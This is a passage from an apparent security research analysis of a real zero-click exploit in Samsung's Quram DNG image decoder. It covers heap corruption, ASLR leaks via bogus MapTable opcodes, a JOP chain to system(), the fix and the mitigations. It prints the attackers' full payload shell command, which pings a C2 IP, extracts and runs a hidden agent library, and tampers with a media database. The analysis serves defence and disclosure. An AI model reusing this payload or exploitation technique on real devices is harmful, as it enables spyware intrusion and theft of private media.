0x4cf0 : 0x4d30
0x4e10 : 0x4e50
0x5cf0 : 0x5d30
0x5e10 : 0x5e50
0x6cf0 : 0x6d30
0x6e10 : 0x6e50
0x7cf0 : 0x7d30
0x7e10 : 0x7e50
0x8cf0 : 0x8d30
0x8e10 : 0x8e50
0x9cf0 : 0x9d30
0x9e10 : 0x9e50
0xacf0 : 0xad30
0xae10 : 0xae50
0xbcf0 : 0xbd30
0xbe10 : 0xbe50
0xccf0 : 0xcd30
0xce10 : 0xce50
0xdcf0 : 0xdd30
0xde10 : 0xde50
0xecf0 : 0xed30
0xee10 : 0xee50
0xfcf0 : 0xfd30
0xfe10 : 0xfe50
```

Using the previously described arbitrary write primitive, the exploit also corrupts various fields of the `TrimBounds` object to transform it into a functional bogus `MapTable` object. Note that a regular `MapTable` opcode object is bigger than a `TrimBounds` opcode and would hence also land in a different scudo heap class in normal circumstances. Obviously, the library is unaware and will just read opcode arguments out of bounds in this case.

The constructed bogus `MapTable` opcode object looks like this:

```

Before:
00007800: f0fc f8cc 7f00 0000 0600 0000 0100 0401  // TrimBounds opcode X
00007810: 0100 0000 0100 0000 0300 0000 0000 0000
00007820: 0000 0000 0100 0000 0100 0000 0000 0000
00007830: 0301 0300 0000 71ca 0000 0000 0000 0000
00007840: f0fc f8cc 7f00 0000 0600 0000 0100 0401  // TrimBounds opcode Y

After:
00007800: 30fd f8cc 7f00 0000 0600 0000 0000 0401
           | |                           \-\---> Will prevent bailout in QuramDngOpcode::aboutToApply
           \---> changed vtable pointer, from TrimBounds to MapTable
00007810: 0100 0000 0100 0000 0300 0000 0000 0000  // Arguments of bogus Maptable,
00007820: 0028 0000 0100 0000 982c 0000 0000 0000  // such as top, left, bottom, right,
00007830: 0100 0000 0100 0000 0100 0000 0000 0000  // plane, planes, ...
00007840: f0fc f8cc 7f00 0000 0600 0000 0100 0401
          \-\--\-\--\-\--\-\----> vtable of the neighboring TrimBounds opcode, interpreted here
                                  as the pointer to the MapTable's substitution table
```

The whole goal of this construction is to have the vtable of another opcode object as the pointer for the MapTable substitution table. If we zero out the memory this MapTable will be applied to beforehand, this will result in a read of two bytes from the TrimBounds vtable, i.e. a leak.

```
/-< Zero'ed memory at offset 0xf000:                   0000 0000 0000 0000 0000 ...
|
|-< MapTable substitution table (TrimBounds vtable):   04b2 a4cd 7f00 0000 a85e ....
|
\-> Transformed memory at offset 0xf000:               04b2 04b2 04b2 04b2 04b2 ....
```

### Leaking interesting pointers

Using the above technique, we can leak arbitrary values at offsets from the TrimBounds vtable. We demonstrated this for offset 0, but the same idea can be applied for other offsets (up to 65536, the maximum index into the substitution table).

Say you want to leak a pointer at offset 0x1f8 from the TrimBounds vtable. This can be achieved in the following way:

```
/-< Prepared memory at offset 0xf000:                                   f001 f101 f201 f301 ...
|
|-< MapTable substitution table (TrimBounds vtable) at offset 0x1f0:    4c5a ebcc 7f00 0000 ....
|
\-> Transformed memory at offset 0xf000:                                4c5a ebcc 7f00 0000 ....
```

But again, the exploit needs to support different library versions. These different library versions have pointers to leak at different offsets from the vtable. But based on the first leak at offset 0, we can “calculate” the right offsets to leak using another `MapTable` operation.

In summary the process goes as follows (illustrated below):

1. Corrupt a `TrimBounds` opcode into a `MapTable` object with the substitution table pointing at the `TrimBounds` vtable.
2. Have the bogus `MapTable` opcode process an area of all zeros. The substituted values will be the lower 2 bytes of the first vtable entry (which is the address of `QuramDngOpcode::~QuramDngOpcode()`). The top nibble will depend on the ASLR slide, and the lower 3 nibbles will be version dependent.
3. Using `MapTable` opcodes with well prepared substitution tables (supporting different ASLR slides and library versions), substitute those values to the offset between the `TrimBounds` vtable and the address of the pointer to leak.
4. Similar to step 1, corrupt another TrimBounds opcode into a MapTable object with the substitution table pointing at the TrimBounds vtable.
5. The bogus `MapTable` will now substitute the offsets from the vtable into their respective values, effectively writing a leaked pointer into memory.

![](<Base64-Image-Removed>)

The memory used for preparing these pointers is at offset 0xf000 from the raw pixel buffer, which contains the last series of 1040 “unknown” opcodes. This memory will become the JOP chain.

The leaked pointers are mostly pointers to functions inside `libimagecodec.quram.so`, as well as the value of libc’s `__system_property_get`, which is located in the GOT. Conveniently the .got segment is located after the `TrimBounds`’s vtable, and within a 65536 bytes offset.

### Preparing the payload

By using more MapTable operations, we can change the leaked pointers to the JOP gadget addresses we are interested in. The leaked libc pointer is changed to the address of `system`.

This is an overview of the leaked pointers and to what they are changed:

| Raw pixel buffer offset | Leaked value | Remapped value for JOP chain |
| --- | --- | --- |
| 0xf000 | `QuramDngFunctionExposureRamp::~QuramDngFunctionExposureRamp()` | `qpng_check_fp_number@got.plt` |
| 0xf038 | `QuramDngFunctionExposureRamp::evaluate(double)` | `qpng_check_IHDR+624` |
| 0xf118 | `QuramDngException::~QuramDngException()` | `__ink_jpeg_enc_process_image_data+64` |
| 0xf138 | `QuramDngException::~QuramDngException()` | `__ink_jpeg_enc_process_image_data+64` |
| 0xf928 | `QuramDngFunctionExposureRamp::evaluate(double)` | `QURAMWINK_Read_IO2+124` |
| 0x10928 | `__system_property_get_ptr` | `system` |

A long shell command is also prepared at offset 0x10000 from the raw pixel buffer, which also falls in that 1040 `Unknown` opcodes region.

We end up with:

- a JOP chain prepared at 0xf000. Note that it is preceded by one of the 1040 `Unknown` opcodes with opcode ID 23 (0x17)

![](<Base64-Image-Removed>)

- a shell command at offset 0x10000. Note again how it is within the region of the `Unknown` opcodes

![](<Base64-Image-Removed>)

![](<Base64-Image-Removed>)

### Triggering the JOP chain

Similar to our initial corruption, we increment values between 0x2800 and 0x6400 with 1, but this time at offset 0x22 within the objects, using `DeltaPerColumn` opcodes. The opcode objects there have been executed by now, so this does not affect them. However, the `QuramDngImage` is also there and offset 0x20 in the QuramDngImage is a pointer to the raw pixel buffer. By adding 1 to offset 0x22, we basically shift the raw pixel buffer pointer with 0x10000 bytes, pointing it right at the shell command.

Finally, the DNG decoder will execute that last series of 1040 “unknown” opcodes. Offset 0xf000 - where we prepared our JOP chain - falls nicely on the boundary of one of those opcodes, so it will be executed as another opcode.

`QuramDngOpcode::aboutToApply` reads the bogus vtable pointer at raw pixel buffer offset 0xf000 and calls the fourth function in it, which will be `qpng_read_data`.

```
QuramDngOpcodeUnknown *__fastcall QuramDngOpcode::aboutToApply(QuramDngOpcode *opcode, QuramDngDecoder *decoder)
{
    int v2; // w8
    QuramDngOpcodeUnknown *v5; // x0
    unsigned int v6; // w1

    v2 = *((_DWORD *)opcode + 4);
    if ( (v2 & 2) != 0 && *((_BYTE *)decoder + 34) )
    {
        *((_BYTE *)decoder + 5377) = 1;
        return 0;
    }
    if ( *((_DWORD *)opcode + 3) >= 0x1040001u && *((_BYTE *)opcode + 0x14) )
    {
        if ( (v2 & 1) != 0 )
            return 0;
        Throw_dng_error(-9994, 0, "QuramDngOpcode::aboutToApply 1", 0);
    }
    if ( ((*(__int64 (__fastcall **)(QuramDngOpcode *, QuramDngDecoder *))(*(_QWORD *)opcode + 0x18LL))(opcode, decoder) // bogus vtable dereference
        & 1) != 0 )
    {
        return (QuramDngOpcodeUnknown *)(((*(__int64 (__fastcall **)(QuramDngOpcode *))(*(_QWORD *)opcode + 16LL))(opcode)
                                        & 1) == 0);
    }
    else
    {
        v5 = (QuramDngOpcodeUnknown *)Throw_dng_error(-9994, 0, "QuramDngOpcode::aboutToApply 2", 0);
        return QuramDngOpcodeUnknown::QuramDngOpcodeUnknown(v5, v6);
    }
}
```

```
.got:00000000002E3390 qpng_check_fp_number_ptr DCQ qpng_check_fp_number  // address of vtable placed at offset 0xf000
.got:00000000002E3398 _ZNK17QuramDngSrational9getReal64Ev_ptr DCQ QuramDngSrational::getReal64(void)
.got:00000000002E33A0 qpng_write_IHDR_ptr DCQ qpng_write_IHDR
.got:00000000002E33A8 qpng_read_data_ptr DCQ qpng_read_data  // bogus vtable entry that will be called
```

When `qpng_read_data gets called`, `x0` will point to the opcode, as it is a method call. `x1` points to the decoder, but is not important for the JOP chain. `x2` is not specifically set up for this function call, but it still points to the `QuramDngImage` from `QuramDngOpcodeList::doApply` higher up the stack (it has not been clobbered). `x2` pointing to the `QuramDngImage` is important for the JOP chain.

`qpng_read_data` will move `x0` into `x19` and call the next gadget, `__ink_jpeg_enc_process_image_data+64`.

```
qpng_read_data:
0000000000196684    STP  X20, X19, [SP,#-0x10+var_10]!
0000000000196688    STP  X29, X30, [SP,#0x10+var_s0]
000000000019668C    ADD  X29, SP, #0x10
0000000000196690    LDR  X8, [X0,#0x138]        ; x8: __ink_jpeg_enc_process_image_data+64
0000000000196694    MOV  X19, X0                ; x19: opcode (offset 0xf000 from the raw pixel buffer)
0000000000196698    CBZ  X8, loc_1966C0
000000000019669C    MOV  X0, X19
00000000001966A0    MOV  X20, X2                ; x20: QuramDngImage
00000000001966A4    BLR  X8                     ; __ink_jpeg_enc_process_image_data+64
```

We jump in the middle of `__ink_jpeg_enc_process_image`, which adds 0x20 to the QuramDngImage pointer, having `x1` point at the address that contains the raw pixel buffer pointer:

```
__ink_jpeg_enc_process_image_data+64:
0000000000161664    LDR  X8, [X19,#0x928]  ; x19: opcode (offset 0xf000 from the raw pixel buffer)
                                           ; x8: QURAMWINK_Read_IO2+124
0000000000161668    ADD  X1, X20, #0x20    ; x20: QuramDngImage
                                           ; x1: address of QuramDngImage.raw_pixel_buffer
000000000016166C    MOV  X0, X19           ; not relevant
0000000000161670    BLR  X8                ; QURAMWINK_Read_IO2+124
```

`QURAMWINK_Read_IO2+124` then dereferences `x1`, which loads the raw pixel buffer pointer into `x1`:

```
QURAMWINK_Read_IO2+124:
0000000000154548    LDR  X8, [X19,#0x38]  ; x19: opcode (offset 0xf000 from the raw pixel buffer)
                                          ; x8: qpng_check_IHDR+624
000000000015454C    LDR  X0, [X19,#8]     ; clobbers x0
0000000000154550    LDR  X1, [X1]         ; x1: dereference address of QuramDngImage.raw_pixel_buffer,
                                          ;     so x1 points to the raw pixel buffer, which was increased
                                          ;     with 0x10000 and now points at the shell command
0000000000154554    BLR  X8               ; qpng_check_IHDR+624
```

`qpng_check_IHDR+624` calls `qpng_error`, which copies the raw pixel buffer pointer from `x1` into `x19`:

```
qpng_check_IHDR+624:
0000000000189608    MOV  X0, X19                        ; x19: opcode (offset 0xf000 from the raw pixel buffer)
000000000018960C    BL   .qpng_error

qpng_error:
000000000018BD30    STP  X20, X19, [SP,#-0x10+var_10]!
000000000018BD34    STP  X29, X30, [SP,#0x10+var_s0]
000000000018BD38    ADD  X29, SP, #0x10
000000000018BD3C    MOV  X19, X1                        ; x19: address of shell command
000000000018BD40    MOV  X20, X0
000000000018BD44    CBZ  X0, loc_18BD5C
000000000018BD48    LDR  X8, [X20,#0x118]               ; x8: __ink_jpeg_enc_process_image+64
000000000018BD4C    CBZ  X8, loc_18BD5C
000000000018BD50    MOV  X0, X20
000000000018BD54    MOV  X1, X19
000000000018BD58    BLR  X8                             ; __ink_jpeg_enc_process_image+64
```

We execute a second time the `__ink_jpeg_enc_process_image+64` gadget, which copies the raw pixel buffer pointer into `x0` and calls `system`. The raw pixel buffer was corrupted before the JOP chain to point at the shell command, resulting in a `system(<shell_command>)` call.

```
__ink_jpeg_enc_process_image+64:
0000000000161664    LDR  X8, [X19,#0x928]  ; x19: address of shell command
                                           ; x8: system
0000000000161668    ADD  X1, X20, #0x20
000000000016166C    MOV  X0, X19           ; x0: address of shell command
0000000000161670    BLR  X8                ; system
```

Below is a summary of the sequence of gadgets and their purpose:

| Gadget | Relevant instructions | Purpose |
| --- | --- | --- |
| `qpng_read_data` | `MOV X19, X0<br>MOV X20, X2` | Copy the opcode address into `x19` and the `QuramDngImage` address into `x20` |
| `__ink_jpeg_enc_process_image_data+64` | `ADD X1, X20, #0x20` | Have `x1` point at `QuramDngImage+0x20` (which contains the raw pixel buffer pointer) |
| `QURAMWINK_Read_IO2+124` | `LDR X1, [X1]` | Dereference `x1`, so it contains the raw pixel buffer pointer |
| `qpng_check_IHDR+624` → `qpng_error` | `MOV X19, X1` | Copy the raw pixel buffer pointer from `x1` into `x19` |
| `__ink_jpeg_enc_process_image+64` | `LDR X8, [X19,#0x928]`<br>`MOV X0, X19`<br>`BLR X8` | Copy the raw pixel buffer from `x19` into `x0` and call `system`. The raw pixel buffer was corrupted before the JOP chain to point at the shell command |
| `system` |  | Execute the shell command |

## Payload

The payload shell command is:

```
/system/bin/sh -c 'ping -c 1 -w1 -p 2066c1d8ce2834f1fbb1296f9dca73419 91.132.92.35 >/dev/null & '; pid=`cat /proc/self/stat | cut -F 4` && ppid=`cat /proc/$pid/stat | cut -F 4`;
rm -f /data/data/com.samsung.ipservice/files/b.so;
rm -f /data/data/com.samsung.ipservice/files/z.zip;
image=`find /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp\ Images/ /storage/emulated/95/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp\ Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1000/Media/WhatsApp\ Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1001/Media/WhatsApp\ Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1002/Media/WhatsApp\ Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1003/Media/WhatsApp\ Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1004/Media/WhatsApp\ Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1005/Media/WhatsApp\ Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1006/Media/WhatsApp\ Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1007/Media/WhatsApp\ Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1008/Media/WhatsApp\ Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1009/Media/WhatsApp\ Images/ /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1010/Media/WhatsApp\ Images/ -type f -atime -720m -maxdepth 1 -exec grep -lo '.*066c1d8ce2834f1fbb1296f9dca73419.*' {} \; -quit 2>/dev/null` ;
/system/bin/sh -c 'ping -c 1 -w1 -p $(test "$image" && echo 31066c1d8ce2834f1fbb1296f9dca73419 || echo 30066c1d8ce2834f1fbb1296f9dca73419) 91.132.92.35 >/dev/null & ' ;
tail -c $(( 390245 )) "$image" > /data/data/com.samsung.ipservice/files/z.zip && unzip -o -d / /data/data/com.samsung.ipservice/files/z.zip && chmod +x /data/data/com.samsung.ipservice/files/b.so;
R=I SEP=CAFEBABE LD_PRELOAD=/data/data/com.samsung.ipservice/files/b.so /system/bin/id;
content write --uri "content://com.samsung.cmh/files?service_flag=update%20files%20SET%20serviceflag%3D%20serviceflag%7C66304";
kill -9 $ppid
```

It performs a series of actions:

- It will ping a C2 server with a custom identifier
- It deletes previous dropped artifacts, if any.
- It searches through all WhatsApp images for itself (using a unique string)
- It unzips `b.so` from itself into `/data/data/com.samsung.ipservice/files/b.so`. Effectively, it is a polyglot of a DNG and ZIP file.

  - Note that only the `com.samsung.ipservice` process is allowed to write here, which confirms this is the targeted process.
- The second-to-last command contains the following `service_flag` URL decoded: `update files SET serviceflag= serviceflag|66304` . That last value (0x10300) is a flag bitmask that will set the `IPService`, `FaceService` and `StoryService` in `com.samsung.cmh`’s `files` table. These flags are used by the different services to track which files they need to process (flag bit set to 0) and have already processed (flag bit set to 1). The likely objective of the attackers here is to prevent future reparsing by these services of the images.

Finally it runs `b.so`, the agent.

## Fix

Curiously, this issue was silently fixed in [Samsung’s April 2025 updates](https://security.samsungmobile.com/securityUpdate.smsb?year=2025&month=04). In September 2025, a CVE was assigned (CVE-2025-21042) by Samsung and the security bulletin updated. Note that not all supported Samsung devices are serviced monthly security updates. Some devices are part of a [quarterly or biannual security update schedule](https://security.samsungmobile.com/workScope.smsb), which means they might have received the fix at a later date. On December 11, 2025, Samsung told us the following: “patches for SVE-2025-1959 have been deployed to all devices supported by Security Update, without exception.”

The fixed function now looks like below (simplified version). The bold parts are the added checks.

```
__int64 __fastcall QuramDngOpcodeDeltaPerColumn::processArea(

  QuramDngOpcode *opcode,
  QuramDngDecoder *decoder,
  QuramDngImage *image,
  QuramDngRect *rect)

{

...
    image_buffer = image->buffer;
...

    image_number_of_planes = image_buffer->planes;  // 3
    opcode_first_plane = opcode->plane;  // 5125
....
    opcode_number_of_planes = opcode->planes;  // 5123
    opcode_last_plane = opcode_first_plane + opcode_number_of_planes;  // 5125 + 5123 = 10248
...
        if ( opcode_first_plane < opcode_last_plane// 5125 < 10248
      && opcode_first_plane < image_number_of_planes )  // 5125 < 3
        {
...  // We will never go here
          current_plane = opcode_first_plane;
...
        do
        {
... // Add delta to the value in the raw pixel buffer at offset corresponding to plane `current_plane`
            current_plane++;
        }
        while ( current_plane < opcode_last_plane
               && current_plane < image_number_of_planes );
...
}
```

As we can see from the fix:

- The `opcode_last_plane` is now calculated correctly.
- Before dereferencing the raw pixel buffer, a check is performed that the `current_plane` is within the number of planes of the image.

## Mitigations

Except for some ASLR bypassing tricks and a little bit of JOP work, no mitigations posed a significant hurdle for the attackers:

- No control flow integrity mitigations, like PAC or BTI, are compiled into the Quram library. This allowed the attackers to use arbitrary addresses as JOP gadgets and construct a bogus vtable.
- The “hardened” scudo allocator wasn’t an obstacle either. The heap spraying primitives - more or less inherent to the DNG format - are quite powerful and allow for a well predicted heap layout, even in the presence of scudo’s randomization strategy. The absence of the quarantine feature is also convenient to deterministically reclaim the spot of the stage 2 image.

MTE would likely have prevented both:

- the initial vulnerability trigger to corrupt the image dimensions
- the hundreds of subsequent out of bounds `MapTable` and `DeltaPerColumn` operations

preventing reliable exploitation of this vulnerability, at least with the current exploit strategy.

## Conclusion

This case illustrates how certain image formats provide strong primitives out of the box for turning a single memory corruption bug into interactionless ASLR bypasses and remote code execution. By corrupting the bounds of the pixel buffer using the bug, the rest of the exploit could be performed by using the “weird machine” that the DNG specification and its implementation provide.

The bug exploited in this case is quite shallow and could have been found manually or through fuzzing. As [Project Zero’s Reporting Transparency](https://projectzero.google/reporting-transparency.html) illustrates, several other vulnerabilities in the same component have been discovered.

These types of exploits do not need to be part of long and complex exploit chains to achieve something useful for attackers. By finding ways to reach the right attack surface and using a single vulnerability, attackers are able to access all the images and videos of an Android’s media store, which is a very interesting capability for spyware vendors.

I would like to thank everyone who contributed to this analysis:

- Meta for the initial leads
- Brendon Tiszka of Google Project Zero for the research on how the `com.samsung.ipservice` attack surface can be reached and the followup research he performed into the Quram library, [leading to several more discoveries](https://googleprojectzero.blogspot.com/p/reporting-transparency.html).
- Clement Lecigne of Google Threat Intelligence Group for assisting in the analysis